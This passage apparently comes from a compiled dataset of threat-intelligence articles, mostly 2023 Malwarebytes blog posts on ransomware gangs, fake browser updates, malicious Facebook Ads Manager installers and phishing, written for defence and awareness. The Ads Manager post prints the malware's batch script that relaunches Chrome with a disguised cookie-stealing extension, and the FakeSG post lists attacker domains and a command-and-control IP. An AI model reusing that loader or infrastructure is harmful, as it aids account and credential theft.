The UK has already sanctioned the GRU after their appalling actions in Salisbury, and has frozen more than £940 billion worth of bank assets and £117 billion in personal net worth from oligarchs and their family members who fund Putin’s war machine."
U.S. State Dept Attribution,https://www.state.gov/attribution-of-russias-malicious-cyber-activity-against-ukraine/,"The United States is joining with allies and partners to condemn Russia’s destructive cyber activities against Ukraine. In the months leading up to and after Russia’s illegal further invasion began, Ukraine experienced a series of disruptive cyber operations, including website defacements, distributed denial-of-service (DDoS) attacks, and cyber attacks to delete data from computers belonging to government and private entities – all part of the Russian playbook. For example, the United States has assessed that Russian military cyber operators have deployed multiple families of destructive wiper malware, including WhisperGate, on Ukrainian Government and private sector networks. These disruptive cyber operations began in January 2022, prior to Russia’s illegal further invasion of Ukraine and have continued throughout the war.

Today, in support of the European Union and other partners, the United States is sharing publicly its assessment that Russia launched cyber attacks in late February against commercial satellite communications networks to disrupt Ukrainian command and control during the invasion, and those actions had spillover impacts into other European countries. The activity disabled very small aperture terminals in Ukraine and across Europe. This includes tens of thousands of terminals outside of Ukraine that, among other things, support wind turbines and provide Internet services to private citizens.

As nations committed to upholding the rules-based international order in cyberspace, the United States and its allies and partners are taking steps to defend against Russia’s irresponsible actions. The U.S. Government has developed new mechanisms to help Ukraine identify cyber threats and recover from cyber incidents. We have also enhanced our support for Ukraine’s digital connectivity, including by providing satellite phones and data terminals to Ukrainian government officials, essential service providers, and critical infrastructure operators. We praise Ukraine’s efforts—both in and outside of government—to defend against and recover from such activity, even as its country is under physical attack.

More information on the U.S. government’s efforts to support cybersecurity and connectivity in Ukraine is available here."
Malwarebytes Threat Intelligence - July 2023,https://www.malwarebytes.com/blog/threat-intelligence/2023/07/ransomware-review-july-2023,"Posted: July 13, 2023 by

Following a three-month lull of activity, Cl0p returned with a vengeance in June and beat out LockBit as the month’s most active ransomware gang.

This article is based on research by Marcelo Rivero, Malwarebytes' ransomware specialist, who monitors information published by ransomware gangs on their Dark Web sites. In this report, ""known attacks"" are those where the victim did not pay a ransom. This provides the best overall picture of ransomware activity, but the true number of attacks is far higher.

Following a three-month lull of activity, Cl0p returned with a vengeance in June and beat out LockBit as the month’s most active ransomware gang. The group's 91 attacks come not long after their extensive GoAnywhere campaign in March, when they hit over 100 organizations using a nasty zero-day.

June also witnessed a staggering increase in attacks from relatively new gangs such as Akira (26) and 8Base (41), enough to propel both of them into the top five—a designation usually reserved for more familiar names like ALPHV, who was conspicuously silent in June.

Other big stories in June include a suspected LockBit affiliate arrest, the Royal ransomware gang toying with a new encryptor, and a notable increase in attacks on the Manufacturing sector.



Known ransomware attacks by gang, June 2023

Comparing June to the earlier months of the year, we notice several shifts in ransomware activity. There was a massive decrease in the activity from Royal, for example, which normally dominates the monthly rankings—often cracking into the top five—with an average of roughly 30 attacks a month in that period. But last month, they posted just two victims.

While a sudden dip in attacks isn't too unusual for top ransomware gangs, it's worth mentioning that in last month’s review we speculated that Royal might be going through a rebrand. That's because a new ransomware called BlackSuit had appeared which shared 98 percent of its code with the infamous Royal ransomware.

Considering that both Royal and BlackSuit were active last month, however, a rebrand probably isn’t happening any time soon. Instead, it’s likely that Royal is simply testing a new encryptor—especially considering that BlackSuit was used in just two attacks last month—and that this lull can be explained as more or less of a research period for them.

Other interesting anomalies in June include 47 attacks on the Manufacturing industry (which usually averages around 20 attacks a month) and notable increases in attacks on Switzerland (14) and Brazil (13), both of which are normally attacked only two or three times a month. Part of this can be explained by the fact that 8BASE disproportionately attacked Brazil with 11 attacks last month, while PLAY focused on Switzerland (5).

Known ransomware attacks by country, June 2023

Known ransomware attacks by industry sector, June 2023

Cl0p's precipitous rise to the top of the charts this month, on the other hand, can be explained by their exploitation of a zero-day in MOVEit Transfer, a widely used file transfer software.

The vulnerability, which could allow attackers to gain escalated privileges and unauthorized access to an environment, was first disclosed on May 31st in a security bulletin released by Progress. But while it was clear earlier on that attackers were actively exploiting CVE-2023-34362, it was only a few days later that it became clear that Cl0p was behind the attacks. A Cl0p representative confirmed that they had been testing the vulnerability since July 2021 and that they had decided to deploy it over the Memorial Day weekend. What’s more, two other vulnerabilities in MOVEit were found while new victims were still coming forward.

In terms of the fallout, it’s tough to overstate the havoc Cl0p was able to wreck thanks to the zero-day.

The MOVEit data breaches had widespread impacts, affecting everything from the Oregon DMV and Louisiana OMV (Office of Motor Vehicles)—including the leak of nearly 10 million drivers' licenses—to the University of Rochester and multiple corporations. PBI Research Services also reported a data breach that exposed information for 4.75 million people. The government even offered a reward of up to $10 million for information on Cl0p after several federal agencies in the US fell victim to the gang.

LockBit

LockBit reportedly squeezed about $91 million out of US organizations with around 1,700 attacks since 2020, according to a June report by CISA. As confirmed by our own research data, CISA also found LockBit took the top spot as the biggest global ransomware threat in 2022.

As for who was hit the hardest, around 16 percent of ransomware incidents affecting State, Local, Tribal, and Tribunal (SLTT) governments were from LockBit, says the MS-ISAC.

In other news, a suspected LockBit affiliate named Ruslan Magomedovich Astamirov, a 20-year-old from the Chechen Republic, was arrested in Arizona last month. The US Justice Department thinks he's been deploying LockBit ransomware on victim networks both in the States and overseas, with the investigation having run from August 2020 through March 2023.

Astamirov is now facing charges of wire fraud and of intentionally damaging protected computers, plus he's accused of making ransom demands through deploying ransomware. The arrest makes him the third LockBit affiliate charged in the US since November.

Newcomers

NoEscape

NoEscape is a new ransomware which been doing the rounds in underground forums since May 2023. Developed in-house using C++, the NoEscape ransomware uses a hybrid approach to encryption, combining ChaCha20 and RSA encryption algorithms for file encryption and key protection.

Last month, NoEscape posted 7 victims on their leak site.

Darkrace

DarkRace is a new ransomware group first discovered by researcher S!Ri. Darkrace specifically targets Windows operating systems and has several similarities to LockBit.

The gang attacked 10 victims last month, the majority of them being from the Information and Communications Technology (ICT) sectors. Geographically, most victims are located in Europe, specifically Italy.

Rhysida

Rhysida, a new ransomware gang claiming to be a ""cybersecurity team,"" has been in operation since May 17, 2023, making headlines for their high-profile attack against the Chilean Army.

The gang published a whopping eighteen victims on their leak site in June, making it one of the most prolific newcomers in our month reviews to-date."
Malwarebytes Threat Intelligence - July 2023 2,https://www.malwarebytes.com/blog/threat-intelligence/2023/07/socgholish-copycat-delivers-netsupport-rat,"Posted: July 18, 2023 by

A new campaign leveraging compromised WordPress sites emerges with another fake browser update.

Over 5 years ago, we began tracking a new campaign that we called FakeUpdates (also known as SocGholish) that used compromised websites to trick users into running a fake browser update. Instead, victims would end up infecting their computers with the NetSupport RAT, allowing threat actors to gain remote access and deliver additional payloads. As we have seen over the years, SocGholish is an established player that has managed to compromise countless victims and deliver ransomware after facilitating the installation of tools like Cobalt Strike or Mimikatz.

Now, there is a potential new competitor in the ""fake updates"" landscape that looks strangely familiar. The new campaign, which we call FakeSG, also relies on hacked WordPress websites to display a custom landing page mimicking the victim's browser. The threat actors are distributing NetSupport RAT either as a zipped download or via an Internet shortcut. While FakeSG appears to be a newcomer, it uses different layers of obfuscation and delivery techniques that make it a threat to take seriously and which could potentially rival with SocGholish.

Campaign similarities

We first heard of this new campaign thanks to a Mastodon post by Randy McEoin. The tactics, techniques and procedures (TTPs) are very similar to those of SocGholish and it would be easy to think the two are related. In fact, this chain also leads to NetSupport RAT. However, the template source code is quite different and the payload delivery uses different infrastructure. As a result, we decided to call this variant FakeSG.

2023-07-19 Update: On June 5, @SecurityAura described an unknown campaign using .hta payloads disguised as driver updates. On June 22, @AnFam17 spotted the same fake browser update leveraging URL shortcuts. Both of these campaigns use a similar structure with compromised WordPress sites hosting the lure shortcuts and a WebDav server that loads NetSupport RAT. RussianPanda (@AnFam17) named the URL shortcut campaign RogueRaticate. Previous indicators of compromise have been added into the IOC section of this post.

Templates

FakeSG has different browser templates depending on which browser the victim is running. The themed ""updates"" look very professional and are more up to date than its SocGholish counterpart.

Website injections

Compromised websites (WordPress appears to be the top target) are injected with a code snippet that replaces the current webpage with the aforementioned fake updates templates. The source code is loaded from one of several domains impersonating Google (google-analytiks[.]com) or Adobe (updateadobeflash[.]website):

That code contains all the web elements (images, fonts, text) needed to render the fake browser update page. We should note that SocGholish used to retrieve media files from separate web requests until more recently when it started using self-contained Base64 encoded images.

Installation flow

There are different installation flows for this campaign, but we will focus on the one that uses a URL shortcut. The decoy installer (Install%20Updater%20(V104.25.151)-stable.url) is an Internet shortcut downloaded from another compromised WordPress site.

This shorcut uses the WebDav HTTP protocol extension to retrieve the file launcher-upd.hta from a remote server:

This heavily obfuscated script is responsible for the execution of PowerShell that downloads the final malware payload (NetSupport RAT).

Malwarebytes's EDR shows the full attack chain (please click to enlarge):

The NetSupport RAT files are hosted on the same compromised WordPress site used earlier to download the Internet shortcut. The RAT's main binary is launched from ""C:\Users\%username%\AppData\Roaming\BranScale\client32.exe"".

Following a successful infection, callbacks are made to the RAT's command and control server at 94.158.247[.]27.

Roommates

Fake browser updates are a very common decoy used by malware authors. In addition to SocGholish, the Domen toolkit was a well-built framework that emerged in 2019 while another campaign known as sczriptzzbn dropped SolarMarker leading to the NetSupport RAT in both cases. Initial access brokers use tools like NetSupport RAT to gather information and perform additional actions on victims of interest. Stolen credentials can be resold to other threat actors tied to ransomware gangs.

It is interesting to see another contender in this relatively small space. While there is a very large number of vulnerable websites, we already see some that have been injected with multiple different malicious code. From a visitor's point of view, this means there could be more than one redirect but the ""winner"" will be the one who is able to execute their malicious JavaScript code first.

We will continue to monitor these campaigns and in particular SocGholish to see if the web delivery landscape changes. Malwarebytes customers are protected as we detect the infrastructure and final payload used in these attacks.

Malwarebytes Threat Intelligence - July 2023 3,https://www.malwarebytes.com/blog/threat-intelligence/2023/07/criminals-target-businesses-with-malicious-extension-for-metas-ads-manager-and-accidentally-leak-stolen-accounts,"Posted: July 12, 2023 by

A group of criminals is actively targeting Facebook business users to gain access to their advertising accounts via malicious Chrome extensions. But we spotted that they made a mistake...

Like all social media platforms, Facebook constantly has to deal with fake accounts, scams and malware. We have written about scams targeting consumers that redirect to fake Microsoft alert pages, but there are also threats targeting businesses that use Facebook to promote their products and services.

In the past few weeks, there's been a resurgence in sponsored posts and accounts that impersonate Meta/Facebook's own Ads Manager. Crooks are promising better advertising via optimization, and increased performance when you use their (malware-laden) software. Meta has tracked and analyzed several threat actors such as DuckTail that have been active for a number of years with a particular interest for Facebook advertising accounts.

Now, we've discovered a new attack that uses malicious Chrome extensions to steal Facebook account credentials and is not related to the DuckTail malware. While tracking this campaign, we noticed the threat actors made a mistake when they packaged one of the malware files with their own stolen data.

We have passed the information about this campaign and the threat actors to Meta and thank it for taking prompt action following our reporting.

Key takeaways

Vietnamese threat actors are actively targeting Facebook business accounts

Victims are lured via fake Ads Manager software promoted on Facebook

Malicious Google Chrome extensions are used to steal and extract login information

Over 800 victims worldwide, 310 in the US

More than $180K in compromised ad budget

Fake Ads Manager accounts

Ads Manager is the product that enables users to run online ads on Facebook, Instagram and other platforms owned by Meta. An article in TechCrunch from May describes how scammers were buying ads from Meta via verified accounts. They were trying to entice potential victims into downloading software to manage their advertising via a ""more professional and secure tool"".

In early June, we identified fraudulent accounts running the same scam using similar lures. It is also worth noting that these accounts often have tens of thousands of followers and any of their posts can quickly become viral. Scammers are primarily targeting business users who may spend ad dollars on the platform.

In order to compromise those accounts, they first need to redirect potential victims onto external websites. We've seen several different domains that are essentially phishing pages using the Meta logo and branding. The lure is the Facebook Ads Manager program that is pushed via a download link. We've seen various cloud providers abused to host these password-protected RAR archives ranging from Google to Trello, as seen below.

Malicious Chrome extension

Once extracted from the archive, the file is an MSI installer package that installs several components under C:\Program Files (x86)\Ads Manager\Ads Manager. We can see a batch script (perhaps named after Google Bard), and two folders. One of them is for a custom Chrome extension while the System folder contains a standalone WebDriver file.

The batch script is launched after the MSI installer completes and essentially spawns a new browser window launched with the custom extension from that previous installation path, pointing the victim to the Facebook login page.

taskkill /F /IM chrome.exe

taskkill /F /IM chromedriver.exe

timeout /t 1 >nul

start chrome.exe --load-extension=""%~dp0/nmmhkkegccagdldgiimedpiccmgmiedagg4"" ""https://www.facebook.com/business/tools/ads-manager""

That custom extension is cleverly disguised as Google Translate and is considered 'Unpacked' because it was loaded from the local computer, rather than the Chrome Web Store. A quick look at its source code reveals immediate hex obfuscation in an attempt to hide what it is actually doing.

After reverse engineering this extension, it became quite clear that it had nothing to do with Google Translate. In fact, the code is entirely focused on Facebook and grabbing important pieces of information that could allow an attacker to log into accounts. We can see that the threat actors are interested in Facebook cookies which they request via the cookies.getAll method.

We also notice an interesting way to exfiltrate that data by using Google Analytics. This technique was previously documented by HUMAN as a way to bypass CSP.

Accidental leak

In total, we identified over 20 different malicious Facebook Ad Manager archives that installed Chrome extensions or instead went with traditional malware executables. While there are variations between samples, the attackers' main goal appears to be the same, namely to collect Facebook business accounts.

While investigating a new phishing site, we saw an archive for download that looked quite different from the others. Ironically, it seems like the threat actors made a mistake and instead of putting the payload, they leaked their own stolen data, or rather the data they stole from victims.

The site we came across pretends to be Meta Ads Manager and boasts the same claims of increasing ad performance that we've seen before. There is a button to download a file called Meta Ads Manager.rar which is hosted on Google Drive.

However, this archive does not contain the expected MSI installer, but instead several text files that were last modified on June 15:

While the file names are self-explanatory, we can see that they contain information about authentication (checkpoint, cookie, token). There is also information about the threat actor who shared this file (file owner) via Google Drive and their Gmail email address (this information has been passed to Meta for further action).

The first row of the file called List_ADS_Tach.txt contains column headers with some names in Vietnamese, confirming the nationality of the individuals behind these attacks. In total, there are 828 rows, which translates into just as many Facebook accounts that were breached.

As expected, the threat actors are particularly interested in their victims' advertising accounts. We can see different metrics related to ad budget (column titles were translated from Vietnamese and may be slightly inaccurate) as well as currencies:

Prized accounts will be those that have a large remaining balance for ad spend. While we do not know if this threat actor is directly associated with DuckTail, they have the same motives of financial profit from hacked Facebook business accounts.

Finally, by converting the data into a map, we can see that victims are not confined to a particular geolocation, in fact they are distributed worldwide.

The threat actors realized their mistake a few days later and trashed the file from their Google Drive account. They also updated the download link on the phishing site, with a new file hosted via MediaFire (fortunately for users, the file was detected as malware and the download is blocked).

A low cost, high yield threat

Business users may be tempted to optimize their ad campaigns on Facebook by clicking on certain posts and downloading programs that claim to increase their earnings. This is, however, a very dangerous practice even if (or especially if) the instructions claim that the software is secure and free of malware. Remember that there is no silver bullet and anything that sounds too good to be true may very well be a scam in disguise.

Fraudsters have a lot of time of their hands and spend years studying and understanding how to abuse social media and cloud platforms, where it is a constant arm's race to keep bad actors out. Based on reports highlighted in TechCrunch's recent article, the threat actors may also reinvest some of the stolen ad budgets to place out malicious ads to ensnare more victims and perpetuating this cycle.

If you did happen to download one of those malicious Facebook Ad Manager installers, Malwarebytes has your back. We were already picking up several components from these campaigns and have added additional protection for optimal detection coverage. Victims will also want to revoke access to unknown users from their Business Manager account profile that the fraudsters may have added, as well as review their transactions history.

We would like to thank Meta for being receptive to our report and helping to keep users safe.

Malwarebytes Threat Intelligence - June 2023,https://www.malwarebytes.com/blog/threat-intelligence/2023/06/ransomware-review-june-2023,"Posted: June 9, 2023 by

May saw a record number of 556 reported ransomware victims, the unusual emergence of Italy and Russia as major targets, and a significant rise in attacks on the education sector.

This article is based on research by Marcelo Rivero, Malwarebytes' ransomware specialist, who monitors information published by ransomware gangs on their Dark Web sites. In this report, ""known attacks"" are those where the victim didn't pay a ransom. This provides the best overall picture of ransomware activity, but the true number of attacks is far higher.

In May, Lockbit, usually the reigning king of ransomware, found a fierce competitor in MalasLocker. Last month also witnessed a record number of 556 reported ransomware victims, the unusual emergence of Italy and Russia as major targets, and a significant rise in attacks on the education sector.

Let's jump right in with MalasLocker, who burst onto the scene last month with 171 total victims—beating out LockBit (76) by almost 100 known attacks.

Known ransomware attacks by gang, May 2023

This isn't the first time this year a gang has overhauled LockBit and climbed to the top spot on our monthly charts. In April Cl0p rose to the number one spot by compromising over 100 victims with a zero-day vulnerability in the widely-used managed file transfer software GoAnywhere MFT.

This month, MalasLocker's meteoric rise to the top can be explained along similar lines.

MalasLocker attacked vulnerabilities in Zimbra servers, including CVE-2022-24682, to enable remote code execution (RCE). Zimbra Collaboration, formerly known as the Zimbra Collaboration Suite (ZCS) is a collaborative software suite that includes an email server and a web client.

What sets MalasLocker most apart, however, is its unique 'charitable' twist. Rather than demanding ransoms, it asked victims to donate to its approved charities.

MalasLocker: The Robin Hood of ransomware?

Needless to say, it is highly unusual for a ransomware gang to purport to attack organizations on altruistic grounds. We haven't seen it once since keeping track of gangs in early 2022.

""Unlike traditional ransomware groups, we're not asking you to send us money. We just dislike corporations and economic inequality,"" reads the MalasLocker ransom note README.txt.

One might assume that a ransomware gang principally opposed to corporations and economic inequality might disproportionately target larger and more wealthy organizations, but this isn't necessarily the case. The gang's blog suggests it's open to targeting businesses of all sizes, so long as they aren't located in ""Latin America, Africa, or other colonized countries.""

We are completely unmoved by MalasLocker's supposed altruism. Ransomware gangs (and cybercriminals in general) have a long and storied history of writing long and tedious tracts justifying their criminal activity with grandiose claims.

MalasLocker is no different. We read its manifesto so you don't have to, and the only line you need to pay any attention to is the one that reads ""so we will become just another ransomware group.""

So far, we have no confirmation that MalasLocker is keeping its word for a decryptor when a victim donates money to a charity.

Known ransomware attacks by country, May 2023

Known ransomware attacks by industry sector, May 2023

Italy and Russia emerge as targets

The upswing in ransomware activity in Italy and Russia in May is striking. Both countries were propelled into the top three most targeted nations in May, a list typically dominated by the USA and the UK.

Italy saw more than a six-fold increase from the month before, and Russia went from zero reported attacks to 50 in a single month. For comparison, Italy had only eight reported ransomware incidents in April, while Russia wasn't even listed. Similarly, in March, Russia had no reported incidents, and Italy had just eight.

The surge in attacks on these two countries is entirely due to MalasLocker, which hit more targets in Russia and Italy than anywhere else. We assume that this is not a matter of deliberate targeting but simply a matter of where there were vulnerable targets.

Known MalasLocker attacks by country, May 2023

Traditionally, most ransomware gangs have avoided targeting Russia and the Commonwealth of Independent States (CIS) to prevent attracting the attention of local authorities who otherwise turn a blind eye to them.

Either MalasLocker isn't based in the CIS and therefore doesn't fear the Federal Security Service (FSB), or they are going to have a very short stay in the ransomware charts.

Increased ransomware attacks on Education

The increase in ransomware attacks on the education sector in May is particularly concerning. May saw 30 known attacks—the highest we've seen in a single month since we started keeping records in early 2022, and the continuation of a trend that has seen a sustained increase over the past twelve months.

Known ransomware attacks against education, June 2022-May 2023

Between June 2022 and May 2023, Vice Society attacked more education targets than any other gang—a specialization that should alarm schools, colleges, and universities everywhere.

A new norm?

Ransomware gangs seem to be adopting a new modus operandi: Exploiting known vulnerabilities for multi-target attacks. This year we have seen Cl0p and MalasLocker attack multiple targets simultaneously with (presumably automated) targeting of specific system weaknesses, expanding the scale and impact of their ransomware operations.

Cl0p, for example, has a history of exploiting platforms like Accellion FTA and GoAnywhere MFT. In April, it shifted its focus to a vulnerability in another popular platform, PaperCut.

In June, as we prepared this report, it emerged that Cl0p was been exploiting yet another vulnerability, this time in the widely used file transfer software MOVEit Transfer. The gang started exploiting the vulnerability on May 27th, during the US Memorial Day holiday.

A security bulletin released on May 31, 2023 by Progress Software states:

“A SQL injection vulnerability has been found in the MOVEit Transfer web application that could allow an un-authenticated attacker to gain unauthorized access to MOVEit Transfer's database. Depending on the database engine being used (MySQL, Microsoft SQL Server, or Azure SQL), an attacker may be able to infer information about the structure and contents of the database in addition to executing SQL statements that alter or delete database elements.“

This approach is unusual and should concern us all because it has the potential to make ransomware attacks more scalable.

New players

BlackSuit

BlackSuit is a new ransomware that is strikingly similar to Royal, sharing 98% of its code. Last month, BlackSuit targeted both Windows and Linux hosts.

BalckSuit could be a new variant developed by Royal's authors, a mimicry attempt using similar code, an affiliate of the Royal ransomware gang running its own modifications, or even a breakaway group from the Royal ransomware gang.

The Black Suit dark web site

Rancoz

Rancoz is a new ransomware variant which shares similarities with Vice Society. Its sophistication lies in its ability to modify existing code from leaked source codes to target specific industries, organizations, or geographic regions, increasing its attack efficacy and ability to evade detection.

The Rancoz dark web leak site

8BASE

8Base is a newly discovered ransomware gang which, despite only recently gaining attention, has been in operation since April 2022. In May, it had a total of 67 victims.

Predominantly targeting small and medium-sized businesses (SMBs), 8Base has attacked mainly companies within the Professional/Scientific/Technical sector, comprising 36% of known attacks, followed by Manufacturing at 17%. Geographical analysis of the victims suggests a concentration in America and Europe, with the United States and Brazil being the most targeted countries.

The 8BASE dark web leak site

RA Group

RA Group is a new ransomware primarily focusing its attacks on pharmaceutical, insurance, wealth management, and manufacturing firms located in the United States and South Korea.

The RA Group employs an encryptor derived from the leaked source code of Babuk ransomware, an operation that ceased in 2021. The encryptor employs intermittent encryption, which alternates between encrypting and not encrypting sections of a file to expedite the encryption process, but leaves some data partially recoverable.

Malwarebytes State of Ransomware Report 2023,https://www.malwarebytes.com/blog/threat-intelligence/2023/08/global-ransomware-attacks-at-an-all-time-high-shows-latest-2023-state-of-ransomware-report,"Posted: August 3, 2023 by

Ransomware gangs are also starting to focus on exploiting zero-days for initial access.

Ransomware attacks have shown no signs of slowing down in 2023.

A new report from the Malwarebytes Threat Intelligence team shows 1,900 total ransomware attacks within just four countries—the US, Germany, France, and the UK—in one year.

The findings, compiled together in the 2023 State of Ransomware Report, show alarming trends in the global ransomware surge from July 2022 to June 2023. For example, the report shows that the US shouldered a hefty 43 percent of all global attacks and that ransomware attacks in France nearly doubled in the last five months.

To say ransomware gangs have been unkind to the US in the past year is an understatement.

Malwarebytes found that a total of 48 separate ransomware groups attacked the US in the observed period. To boot, there was a 75 percent increase in the average number of monthly attacks in the US between the first and second half of the last 12 months.

The UK, on the other hand, emerged as the second-largest ransomware target, enduring close to 200 ransomware attacks.

Malwarebytes tracked 32 separate ransomware groups attacking the UK, seven of which recorded more than ten known attacks. In addition, more ransomware gangs are attacking targets multiple times a month: the number of groups carrying out more than one known attack per month in the UK has climbed steadily for a year, from just one in July 2022 to eight in June 2023.

Neither France or Germany have been spared by the growing menace of ransomware, either.

Germany retained its place as the fourth most attacked country in the world, and the most attacked country outside of the anglosphere. France meanwhile experienced a disproportionately high rate of attacks on its government sector (9 percent of attacks).

Perhaps the biggest takeaway from the report, however, is that the ascension of the CL0P group—which has effectively harnessed zero-day vulnerabilities to amplify its attacks—could signal a change in the game.

A New Threat on the Horizon: CL0P

For a year and a half, LockBit, which claims to have 100 affiliates, has been the most dominant form of “Ransomware-as-a-Service” (RaaS) in the US, averaging about 24 attacks per month.

However, twice this year, in March and June, LockBit's considerable rate of attacks was vastly exceeded by CL0P, which was otherwise dormant.

The drive behind the sudden change? CL0P used separate zero-days in GoAnywhere MFT and MOVEit Transfer to gain an edge. This gave them the ability to launch an unprecedented number of attacks within a short time frame and across a massive scale.

The use of zero-day vulnerabilities by ransomware groups like CL0P may trigger a significant shift in ransomware strategies, mirroring the adoption of the ""double extortion"" tactic in 2019.

If more groups start adopting CL0P's zero-day exploitation techniques, the ransomware landscape could tilt from service-oriented attacks to a more aggressive, vulnerability-focused model—a move that could skyrocket the number of victims.

Malwarebytes Threat Intelligence - July 2023 4,https://www.malwarebytes.com/blog/threat-intelligence/2023/07/malicious-ad-for-usps-phishes-for-jpmorgan-chase-credentials,"Posted: July 5, 2023 by

Next time you need to track a package, be aware that malicious ads could be leading you to sites that steal your banking information.

We often think of malvertising as being malicious ads that push malware or scams, and quite rightly so these are probably the most common payloads. However, malvertising is also a great vehicle for phishing attacks which we usually see more often via spam emails.

Threat actors continue to abuse and impersonate brands, posing as verified advertisers whose only purpose is to smuggle rogue ads via popular search engines. In this blog post, we review a recent phishing attack that was targeting both mobile and Desktop users looking up to track their packages via the United States Postal Service website.

A Google search returned an ad that looked completely trustworthy. Yet, it redirects victims to a malicious site that first collects their address, credit card details and, requires them to log into their bank account for verification.

This elaborate phishing scheme is a reminder that malvertising via search results remains an issue that affects both consumers and businesses who place their trust behind well-known brands.

Malicious ad looks 100% legitimate

We were able to immediately find this same campaign by performing a simple Google search for ""usp tracking"". Incredibly, the ad snippet contains the official website and logo of the United States Postal Service and yet, the ""advertiser"" whose verified legal name is Анастасія Іващенко (Ukraine), has nothing to do with it.

This fake advertiser had 2 different ad campaigns, one that appears to target Mobile and the other Desktop users:

Address verification and update just a trick to get banking credentials

One may wonder how threat actors are able to use the official URL in the ad and redirect victims to their own different website. The URLs shown in the ad are pure visual artifacts that have nothing to do with what you actually click on. When you click on the ad, the first URL returned is Google's own which contains various metrics related to the ad, followed by the advertiser's own URL. Users never get to see this, and that is what makes malvertising via brand impersonation so dangerous.

Victims that click on the ad land on a website that asks them to enter their tracking number(s), just as they would expect it. However, upon submitting that information they receive an error stating ""Your package could not be delivered due to incomplete information in delivery address.""

It is not unusual to receive this kind of notification either. Users are then asked to enter their full address again but also need to pay a small fee of 35 cents by submitting their credit card information. This is the first clue that there is something amiss here.

Victims are entering their credit card number into a phishing website. The small fee is completely irrelevant as there is much more damage that can be done by reselling this stolen data on criminal markets.

The final step consists of asking users to enter their credentials for their financial institution. The phishing page is dynamic and will generate a template based on the card number previously inputed. For example, here we have a VISA card and the associated bank is JP Morgan:

For a different card such as MasterCard, here's the associated phishing page:

Falling for malvertising remains too easy

In the security field, we often speak about and recommend user education and training. When it comes to malvertising, awareness is important but training can only go so far. The example from this blog post shows why: malicious ads often look entirely legitimate and we can't expect users to run queries on domain names and infrastructure to discern any malfeasance.

Brand impersonation is a huge problem and the solution to combat it starts with search engines applying stricter controls. When it comes to software downloads, one solution that comes to mind is reserving a placeholder for the official download page and never allowing an ad to take this spot. Microsoft's Bing has done that quite well for the most part and such a policy would have a drastic impact on the safety of millions of users.

Security vendors like Malwarebytes will continue to protect their users thanks to browser protection tools available for businesses and consumers. The malvertising killchain can be disrupted from the initial ad, all the way to the payload (malware, phishing or scam). Only a full protection suite with real time protection can target those critical distribution points.

We have reported this incident to Google and Cloudflare has already flagged the domains as phishing.

Malwarebytes Threat Intelligence - June 2023 1,https://www.malwarebytes.com/blog/threat-intelligence/2023/06/thousands-of-malicious-google-cloud-run-instances-deployed-to-scam-facebook-users,"Posted: June 7, 2023 by

Clickbait posts on Facebook can lead to malicious websites. In this campaign, crooks are redirecting Facebook victims to scam pages hosted on Google's infrastructure.

Online criminals are notorious for lurking on social media sites and tricking users into visiting malicious links. We recently observed a scheme where Facebook users are clicking on posts that lead to external websites set up for the sole purpose of scamming them out of hundreds of dollars via fake browser alerts.

What is unique with this campaign is the abuse of Google Cloud Run to generate new malicious links every few minutes. We've previously never seen tech support scams hosted on Google's serverless platform, and certainly not at this scale. In this blog, we expose the techniques used by scammers to lure victims while evading detection.

We have reported these incidents to both Facebook and Google.

Facebook posts with malicious links

Facebook relies on users sharing content by posting photos, videos or links to various stories. However, when a link is posted for an external website, Facebook can no longer control the user experience, and in particular any risk that may occur from visiting it.

We identified several Facebook accounts that were posting a number of stories, ranging from clickbait articles to newsworthy content. We're unsure whether those accounts were compromised or not, but we noticed that the same account posted more than one malicious link but at different time intervals, indicating that it might have been controlled by a threat actor.

In the next section, we take a look at how these websites are set up in a way to deceive security controls by employing a technique known as cloaking.

Decoy/cloaking

If you were to visit the URLs while running a VPN or perhaps via a country that is not targeted, you will see what appears to be a typical news site devoid of any scam. But the closer you look at those sites, the more you realize they are bogus: They're essentially the same content with different domain names. This is the same old cloaking technique where a fraudster creates a decoy page to deceive online platforms and security tools.

Now, if you happen to click on a Facebook post as a real human (not a bot or using a VPN), you will get something entirely different, as the cloaking domains will perform a 302 redirect. This is a simple server-side instruction that will load another website immediately and seamlessly.

In the diagram below, we can see the network traffic and details for each web request, eventually loading a page that we are all too familiar with: a fake Microsoft alert.

Google Cloud Run ""infrastructure""

One thing that drew our attention immediately was that the fake error pages are hosted on Google Cloud Run, a ""managed computer platform that lets you run containers directly on top of Google's scalable infrastructure"". Essentially, developers only need to create a container and deploy it as a micro service, without the need for a server, allowing them to focus on the code instead.

For a scammer, this is simply another platform they can abuse with minimum overhead costs. In fact, Google offers new customers $300 in free credits to spend on Cloud Run and two million requests free per month, not charged against credits.

We monitored the cloaking domains closely for some time and determined that the threat actor has set up a scheduled task that creates a new Cloud Run URL every 5 minutes. This new URL is immediately available and assigned to the cloaking domain for the malicious redirect. Over the course of a few days, we observed thousands of malicious URLs:

Not only does the URL keep on changing, but the IP addresses they are using are also shared with other customers. This means that any security product relying on a domain or IP blocklist will be unable to keep up with this campaign.

Staying protected with social media and scams

Social media can be a great source of entertainment or a way to connect with family and friends. However, there are inherent risks to using these platforms and caution should be exercized. Clickbait articles are notorious for leading to various bogus offers or worse.

Another issue is how promoted posts can quickly become viral as victims inadvertently share links with their contacts. Certainly, tech support scammers are well aware of how to target certain demographics, such as seniors, and lure them in via deceiving Facebook posts. As always, we recommend not to panic even if your computer screen suddenly becomes hijacked as a stern audio recording plays back. In practically all cases, you can safely close these pop-ups and be back up and running quickly.

Malwarebytes Browser Guard is able to protect against these attacks flawlessly, no matter how many times the fraudsters swap Google Cloud Run URLs. The built-in fraud heuristic engine is able to detect the malicious code and block it in real time.

Malwarebytes Threat Intelligence - May 2023 1,https://www.malwarebytes.com/blog/threat-intelligence/2023/05/malvertising-its-a-jungle-out-there,"Posted: May 23, 2023 by

Ads containing the official website of an impersonated brand are running again, allowing fraudsters to scam users.

Web search is about to embark on a new journey thanks to artificial intelligence technology that online giants such as Microsoft and Google are experimenting with. Yet, there is a problem when it comes to malicious ads displayed by search engines that AI likely won't be able to fix.

In recent months, numerous incidents have shown that malvertising is on the rise again and affecting the user experience and trust in their favorite search engine. Indeed, Search Engine Results Pages (SERPs) include paid Google ads that in some cases lead to scams or malware.

One particularly devious kind of malvertising is brand impersonation where criminals are buying ads and going as far as displaying the official brand's website within the ad snippet. We previously reported several incidents to Google and it appeared that those ads using official URLs were no longer getting through. However, just recently we noticed a surge in new campaigns again.

Brand abuse: Scammers exploit users' trust

